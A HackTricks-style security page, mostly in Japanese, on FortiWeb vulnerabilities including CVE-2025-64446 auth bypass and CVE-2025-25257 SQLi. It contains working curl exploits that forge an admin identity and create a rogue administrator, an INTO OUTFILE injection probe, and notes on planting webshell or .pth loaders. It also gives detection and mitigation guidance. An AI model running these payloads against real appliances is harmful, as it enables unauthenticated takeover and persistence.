# Fortinet FortiWeb — Auth bypass via API-prefix traversal and CGIINFO impersonation

{{#include ../../banners/hacktricks-training.md}}

## 概要

Fortinet FortiWeb は `/cgi-bin/fwbcgi` に集中型の CGI ディスパッチャを公開しています。2つの脆弱性チェーンにより、認証されていないリモート攻撃者は次のことが可能になります:
- 有効な API プレフィックスで URL を開始しディレクトリを横断することで `fwbcgi` に到達できる。
- CGI が識別として信頼する特別な HTTP ヘッダを送ることで、任意のユーザ（組み込みの `admin` を含む）になりすますことができる。

ベンダーアドバイザリ: FG‑IR‑25‑910 (CVE‑2025‑64446)。実際の攻撃で永続的な管理者ユーザを作成する目的で悪用されていることが確認されています。

影響を受けるバージョン（公開されている情報）:
- 8.0 < 8.0.2
- 7.6 < 7.6.5
- 7.4 < 7.4.10
- 7.2 < 7.2.12
- 7.0 < 7.0.12
- 6.4 ≤ 6.4.3
- 6.3 ≤ 6.3.23

FortiWeb 8.0.2 は下記のトラバーサルプローブに対して HTTP 403 を返します。

## クイック脆弱性プローブ

- API プレフィックスから `fwbcgi` へのパストラバーサル:
```http
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: <target>
```
- 解釈: HTTP 200 → 脆弱である可能性が高い; HTTP 403 → 修正済み。

## 根本原因の連鎖

1) API プレフィックス経由で内部 CGI へのパス・トラバーサル
- 有効な FortiWeb API プレフィックス（例: `/api/v2.0/cmdb/` や `/api/v2.0/cmd/`）で始まる任意のリクエストパスは、`../` を使って `/cgi-bin/fwbcgi` にトラバースできる。

2) 最小限のボディ検証バイパス
- `fwbcgi` に到達すると、最初のゲートが `/var/log/inputcheck/` 以下のパスごとのファイルをキーにした寛容な JSON チェックを行う。ファイルが存在しなければチェックは即座に通る。存在する場合、ボディは有効な JSON であるだけでよい。最小の準拠ボディとして `{}` を使う。

3) HTTP ヘッダによるユーザ偽装
- プログラムは CGI 環境変数 `HTTP_CGIINFO`（HTTP ヘッダ `CGIINFO` に由来）を読み取り、Base64 デコードして JSON をパースし、属性をそのままログインコンテキストにコピーして domain/VDOM を設定する。注目すべきキー:
- `username`, `loginname`, `vdom`, `profname`
- 組み込み admin を偽装するための例 JSON:
```json
{
"username": "admin",
"profname": "prof_admin",
"vdom": "root",
"loginname": "admin"
}
```
上記のBase64（実際に使われている例）:
```
eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
```
## エンドツーエンドの悪用パターン（未認証 → 管理者）

1) APIプレフィックスのトラバーサルを使って `/cgi-bin/fwbcgi` に到達する。  
2) 入力チェックを満たすために任意の有効なJSONボディ（例: `{}`）を提供する。  
3) ヘッダ `CGIINFO: <base64(json)>` を送信する。ここでJSONはターゲットのアイデンティティを定義する。  
4) `fwbcgi` が期待するバックエンドJSONをPOSTして特権操作を実行する（例: 永続化のために管理者ユーザを作成）。

### 最小限の cURL PoC

- トラバーサルの露出を確認する:
```bash
curl -ik 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
- 管理者になりすまして、新しいローカル管理者ユーザーを作成する:
```bash
# Base64(JSON) for admin impersonation
B64='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='

curl -ik \
-H "CGIINFO: $B64" \
-H 'Content-Type: application/json' \
-X POST \
--data '{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","type":"local-user","type_val":"0","password":"P@ssw0rd!"}}' \
'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
ノート:
- `/var/log/inputcheck/<path>.json` が存在しない場合、任意の有効な JSON ボディ（例: `{}`）で問題ありません。
- アクションスキーマは FortiWeb 内部用です；上の例ではフル権限のローカル管理者を追加しています。

## その他、素早く確認すべき FortiWeb 2025 の脆弱性

### 事前認証 Fabric Connector SQLi → RCE (CVE-2025-25257)
- 影響バージョン: 7.6.0–7.6.3, 7.4.0–7.4.7, 7.2.0–7.2.10, 7.0.0–7.0.10。修正済み: 7.6.4 / 7.4.8 / 7.2.11 / 7.0.11。
- バグ: `get_fabric_user_by_token()` は `Authorization: Bearer <token>` の値を SQL クエリに直接使用します。攻撃者は MySQL ユーザとして実行される SQL を注入でき、`SELECT ... INTO OUTFILE` によりファイルを出力して code exec (webshell/`.pth` loader) を達成できます。
- 典型的な攻撃対象: `/api/fabric/device/status`（および他の Fabric Connector エンドポイント） — 管理プレーン上の HTTP/HTTPS 経由。
- SQLi の簡易検証:
```bash
curl -sk -X POST \
-H "Authorization: Bearer ' UNION SELECT NULL,NULL,NULL,NULL INTO OUTFILE '/data/var/tmp/pwn.txt' -- -" \
https://<host>/api/fabric/device/status
```
- Weaponization: write a `.pth` into FortiWeb's Python site-packages that imports `os;os.system(...)` on interpreter start, or drop a CGI under the webroot. Reloading services will execute the payload.
- ハンティングの手がかり: Authorization ヘッダに quotes/UNION/SELECT を含む；`/data/lib/python*/site-packages/` または `/data/var/waf/html/ROOT/cgi-bin/` に予期しないファイルがある。

### FortiCloud SSO signature bypass (CVE-2025-59719)
- 不適切な SAML 署名検証により攻撃者は FortiCloud SSO レスポンスを偽造し、認証情報なしで admin としてログインできる。
- **FortiCloud SSO login** が有効な場合にのみ悪用可能（アプライアンスが GUI 経由で登録されていると自動で有効になることがある、チェックボックスがオフでない限り）。
- 影響を受けるバージョン（PSIRT による）: 8.0.0, 7.6.0–7.6.4, 7.4.0–7.4.9. 修正済み: 8.0.1 / 7.6.5 / 7.4.10.

### OS command injection in management plane (CVE-2025-58034)
- 影響を受けるバージョン: 7.0.0–7.0.11, 7.2.0–7.2.11, 7.4.0–7.4.10, 7.6.0–7.6.5, 8.0.0–8.0.1. 修正済み: 7.0.12 / 7.2.12 / 7.4.11 / 7.6.6 / 8.0.2.
- 実用的なプローブ（非破壊）: 管理用 HTTP エンドポイントに ``;id;`` を含むパラメータを送信し、コマンド出力を含む 500 レスポンスが返るか監視する。出力が見られたら直ちにブロックまたはパッチを適用する。

## Detection

- API プレフィックスのパスに `../` を含む経由で `/cgi-bin/fwbcgi` に到達するリクエスト（例: `/api/v2.0/cmdb/.../../../../../../cgi-bin/fwbcgi`）。
- ヘッダ `CGIINFO` が存在し、Base64 化された JSON に `username`/`loginname`/`vdom`/`profname` のキーが含まれる。
- Fabric Connector SQLi: Authorization ヘッダに SQL メタ文字が含まれる、Python site-packages/CGI ディレクトリに突然ファイルが出現する、インターネットの IP から `/api/fabric/device/status` へのアクセスなど。
- FortiCloud SSO: `/var/log/ssod` に予期しない SAML issuer や audience の値がある。
- バックエンドの痕跡:
- パスごとのファイルが `/var/log/inputcheck/` に存在する（gate 設定）。
- 不審な admin 作成や設定変更。
- 迅速な検証: トラバーサルプローブが 200 を返す（公開）か 403 を返すか（修正済みビルドではブロック）。

## Mitigation

- ベンダーのアドバイザリに従い、修正済みリリースへアップグレードする（例: 8.0.2, 7.6.5, 7.4.10, 7.2.12, 7.0.12）。
- 他の 2025 年の脆弱性もパッチ適用する: SQLi (7.6.4/7.4.8/7.2.11/7.0.11), SSO bypass (8.0.1/7.6.5/7.4.10), command injection (7.6.6/7.4.11/7.2.12/7.0.12/8.0.2)。
- パッチ適用までの間:
- FortiWeb の管理プレーンを信頼できないネットワークに公開しない。
- 以下をブロックするリバースプロキシ/WAF ルールを追加する:
- `/api/` で始まり `../cgi-bin/fwbcgi` を含むパス。
- `CGIINFO` ヘッダを持つリクエスト。
- Authorization に SQL メタ文字を含む Fabric Connector 呼び出し。
- FortiCloud SSO を使用していない場合は SAML エンドポイントをインターネットに公開しない。
- 上記の検出指標を監視し、アラートを設定する。

## References

- [When the impersonation function gets used to impersonate users — Fortinet FortiWeb auth bypass (watchTowr Labs)](https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/)
- [watchTowr vs FortiWeb Auth Bypass — Detection artefact generator](https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass)
- [CVE-2025-25257 — Fabric Connector pre-auth SQLi PoC](https://github.com/mrmtwoj/CVE-2025-25257)
- [FortiCloud SSO signature bypass overview (CVE-2025-59719)](https://cyberpress.org/fortios-fortiweb-fortiproxy-flaw-allows-attackers-to-bypass-forticloud-sso/)

{{#include ../../banners/hacktricks-training.md}}
